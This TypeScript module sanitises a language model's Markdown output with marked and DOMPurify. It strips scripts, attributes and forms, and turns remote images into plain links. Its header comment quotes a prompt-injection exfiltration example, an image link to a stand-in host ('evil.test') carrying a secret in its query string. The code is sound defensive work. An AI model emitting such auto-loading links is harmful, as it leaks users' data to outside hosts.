/**
 * Markdown rendering for model output.
 *
 * Model output is untrusted. It is parsed by marked and then sanitised by a
 * private DOMPurify instance, which returns DOM nodes directly, so no HTML
 * string is ever assigned to innerHTML. Both libraries are loaded on first
 * use (architecture rule 8: heavy libraries are lazy).
 *
 * Beyond removing scripts, the output may not make the browser contact any
 * other host by itself: a prompt-injected `![](https://evil.test/?q=secret)`
 * would otherwise leak data the moment it renders. Remote images become
 * ordinary links (alt text and host), and every other auto-loading element or
 * attribute is removed. Only `data:` and `blob:` images are shown inline.
 */

// Type-only imports: erased at build time, so the libraries stay out of the
// eager bundle.
import type { DOMPurify } from 'dompurify';
import type * as Marked from 'marked';

interface Libraries {
  marked: typeof Marked;
  purify: DOMPurify;
}

let libraries: Promise<Libraries> | undefined;

/**
 * The only attributes model output may carry. Everything the page itself uses
 * to look or behave like UI is refused: `class` (Bootstrap could draw a
 * full-screen fake dialog or hide text that Copy code copies), `data-*`
 * (Bootstrap's data API), `role`/`aria-*`, `tabindex`, `hidden`, `inert`,
 * `for` and `popovertarget` (which forward clicks to the page's real
 * controls, whose ids are predictable), `id`/`name` (DOM clobbering) and
 * `style`. `target`/`rel` on links are added afterwards by a hook.
 */
const ALLOWED_ATTR = new Set([
  'href',
  'src',
  'alt',
  'title',
  'align',
  'colspan',
  'rowspan',
  'start',
  'type',
  'checked',
  'disabled',
  'class',
]);

/** Allowed attributes that are only allowed on some elements, or with some values. */
const ATTRIBUTE_RULES: Record<string, (element: string, value: string) => boolean> = {
  // Fenced code blocks: `language-js` and the like, nothing else.
  class: (element, value) => element === 'code' && /^language-[\w+#.-]+$/.test(value),
  // GFM task lists (see keepOnlyTaskCheckboxes).
  type: (element) => element === 'input',
  checked: (element) => element === 'input',
  disabled: (element) => element === 'input',
};

/** Loads both libraries once. A failed load is not remembered, so the next call retries. */
function loadLibraries(): Promise<Libraries> {
  libraries ??= Promise.all([import('marked'), import('dompurify')]).then(
    ([marked, { default: createPurify }]) => {
      // A private instance: hooks added here cannot leak into other users of DOMPurify.
      const purify = createPurify(window);
      // The allowlist is enforced here: with USE_PROFILES, DOMPurify ignores ALLOWED_ATTR.
      purify.addHook('uponSanitizeAttribute', (node, data) => {
        const rule = ATTRIBUTE_RULES[data.attrName];
        if (!ALLOWED_ATTR.has(data.attrName) || (rule && !rule(node.localName, data.attrValue))) {
          data.keepAttr = false;
        }
      });
      purify.addHook('afterSanitizeAttributes', (node) => {
        if (node instanceof Element && node.localName === 'a' && node.hasAttribute('href')) {
          // In-page links stay in the page; everything else opens in a new tab
          // without a handle on, or a referrer from, this page.
          if (!(node.getAttribute('href') ?? '').startsWith('#')) {
            node.setAttribute('target', '_blank');
            node.setAttribute('rel', 'noopener noreferrer');
          }
        }
      });
      return { marked, purify };
    },
  );
  libraries.catch(() => {
    libraries = undefined;
  });
  return libraries;
}

/**
 * Renders Markdown to sanitised DOM.
 *
 * ```ts
 * output.replaceChildren(await renderMarkdown(text));
 * ```
 *
 * Removed: scripts, event handlers, `javascript:` URLs, styles, forms and
 * form controls (except GFM task-list checkboxes, which are disabled),
 * frames, embedded objects and media, anything that would load a remote
 * resource, and every attribute outside ALLOWED_ATTR.
 */
export async function renderMarkdown(markdown: string): Promise<DocumentFragment> {
  const { marked, purify } = await loadLibraries();
  const html = await marked.parse(markdown, { async: true, gfm: true });
  const fragment = purify.sanitize(html, {
    RETURN_DOM_FRAGMENT: true,
    USE_PROFILES: { html: true },
    FORBID_TAGS: [
      'style',
      'form',
      'button',
      'textarea',
      'select',
      'iframe',
      'object',
      'embed',
      'audio',
      'video',
      'source',
      'track',
      'picture',
      'map',
      'area',
    ],
    ALLOW_DATA_ATTR: false,
    ALLOW_ARIA_ATTR: false,
    // DOMPurify's default URL allow-list plus `blob:` (object URLs this page made).
    ALLOWED_URI_REGEXP:
      /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix|blob):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  });
  // The fragment still belongs to DOMPurify's inert document, so nothing in
  // it has started loading yet.
  neutraliseImages(fragment);
  keepOnlyTaskCheckboxes(fragment);
  return fragment;
}

/** Shows `data:`/`blob:` images inline; turns remote images into links and drops the rest. */
function neutraliseImages(root: DocumentFragment): void {
  for (const img of root.querySelectorAll('img')) {
    const src = img.getAttribute('src')?.trim() ?? '';
    if (/^(data|blob):/i.test(src)) continue;

    const alt = img.getAttribute('alt')?.trim() || 'Image';
    let replacement: Node = img.ownerDocument.createTextNode(alt);
    try {
      const target = new URL(src);
      if (target.protocol === 'https:' || target.protocol === 'http:') {
        const link = img.ownerDocument.createElement('a');
        link.href = target.href;
        link.target = '_blank';
        link.rel = 'noopener noreferrer';
        link.textContent = `${alt} (${target.host})`;
        replacement = link;
      }
    } catch {
      // Relative or malformed: nothing worth linking to.
    }
    img.replaceWith(replacement);
  }
}

/** GFM task lists render `<input type="checkbox" disabled>`; any other input is removed. */
function keepOnlyTaskCheckboxes(root: DocumentFragment): void {
  for (const input of root.querySelectorAll('input')) {
    if (input.getAttribute('type')?.toLowerCase() !== 'checkbox') {
      input.remove();
      continue;
    }
    for (const name of input.getAttributeNames()) {
      if (name !== 'type' && name !== 'checked') input.removeAttribute(name);
    }
    input.setAttribute('disabled', '');
  }
}
